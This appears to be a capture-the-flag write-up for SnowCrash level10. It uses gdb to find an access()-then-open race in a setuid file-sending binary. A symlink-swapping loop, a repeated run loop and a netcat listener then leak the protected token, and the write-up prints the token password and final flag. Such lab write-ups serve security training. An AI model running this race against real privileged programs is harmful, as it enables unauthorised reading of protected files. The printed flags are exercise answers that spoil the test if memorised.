level10@SnowCrash:~$ ls
level10  token
level10@SnowCrash:~$ cat token
cat: token: Permission denied

we dont have the permission to view token, lets execute level10.

level10@SnowCrash:~$ ./level10
./level10 file host
	sends file to host if you have access to it

using gdb we find out that the program has a condition that checks whether two arguments are passed in or not.

   0x080486f6 <+34>:	cmp    DWORD PTR [ebp+0x8],0x2
   0x080486fa <+38>:	jg     0x804871f <main+75>

lets see what happens if we pass in two arguments

level10@SnowCrash:~$ ./level10 file world
Connecting to world:6969 .. Unable to connect to host world


the first argument is a file, second argument is the address to which the file is sent, 6969  is the port

lets use a real address

level10@SnowCrash:~$ ./level10 file 127.0.0.1
Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1


still cant connect, lets make sure the port is open

level10@SnowCrash:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::4646                 :::*                    LISTEN      -
tcp6       0      0 :::4747                 :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::4242                 :::*                    LISTEN      -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -


as we can see 6969 isnt open, lets use netcat to open it

level10@SnowCrash:~$ echo hello > file
we listen in to the port 6969

level10@SnowCrash:~$ nc -l 6969

level10@SnowCrash:~$ ./level10 file 127.0.0.1
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!

level10@SnowCrash:~$ nc -l 6969
.*( )*.
hello


now lets debug
so after verifying that the number of arguments is 2, it moves on to the following instructions
   0x08048749 <+117>:	call   0x80485e0 <access@plt>
   0x0804874e <+122>:	test   eax,eax
   0x08048750 <+124>:	jne    0x8048940 <main+620>
   0x08048756 <+130>:	mov    eax,0x8048a7b
   0x0804875b <+135>:	mov    edx,DWORD PTR [esp+0x2c]

   access checks that the file is assessible using the real user permisisons 
   and since token is owned by flag10 then access will determine that its inaccessible.
   the solution is then to exploit the short time delay between the access check, and the next task.
   one solution would be to write a script that keeps creating a file called token, then deleting it and creating a symbolic link of the real token, and keep doing this over and over while another script runs the executable repeatedly.
   eventually there will be a time when access will check our created file and determine it accessible then quickly thqt file gets deleted and replaced by the symbolic link of the real token

   lets write the first script
   level10@SnowCrash:~$ chmod 777 .
   level10@SnowCrash:~$ mkdir folder
   level10@SnowCrash:~$ cd folder
   level10@SnowCrash:~/folder$
   
   first script:
   while true
    do
    touch token
    chmod 777 token
    rm -rf token
    ln -s ../token token
    rm token
    done


lets run each of these commands in a different terminal

while true; do  ./level10 file 127.0.0.1 ; done

nc -lk 6969

 we end up getting the flag

 .*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.

level10@SnowCrash:~$ su flag10
Password:
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c